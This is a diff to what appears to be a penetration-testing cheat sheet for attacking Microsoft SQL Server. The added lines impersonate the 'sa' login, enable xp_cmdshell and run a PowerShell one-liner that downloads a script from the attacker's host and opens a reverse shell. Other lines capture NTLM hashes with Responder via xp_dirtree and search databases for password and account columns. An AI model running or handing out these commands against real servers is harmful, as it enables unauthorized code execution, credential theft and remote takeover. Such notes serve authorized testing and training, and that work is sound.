@@ -1267,18 +1267,25 @@ impacket-mssqlclient -k -no-pass -dc-ip $TARGET -target-ip $TARGET $DC
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET'
 impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 
++---------- Impersonate ----------+
+enum_impersonate
+EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+xp_cmdshell whoami /priv
+xp_cmdshell powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://$MYIP:53/resh.ps1\"); resh -Reverse $MYIP -Port 80"
+
 +---------- Get Hash ----------+
 sudo responder -I tun0 -v
 xp_dirtree \\$MYIP\$;
 DB_NAME="master"; sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "EXEC xp_dirtree '//$MYIP/RESPONDER';"
 
-+---------- Get DB ----------+
++---------- Execute Commands ----------+
+-->> Get DB Names
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -C "SELECT name FROM master.dbo.sysdatabases;" | grep -oP '^name:\s*\K\S+'
 
-+---------- Set DB ----------+
+-->> Set DB Name
 DB_NAME="master"
 
-+---------- Query DB ----------+
+-->> Query DB
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'user'
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS;" | grep -i -B2 'passw'
 sqsh -S $TARGET -U '$USERNAME' -P '$PASSWORD' -m vertical -D $DB_NAME -C "SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;" | grep -Ei 'account'
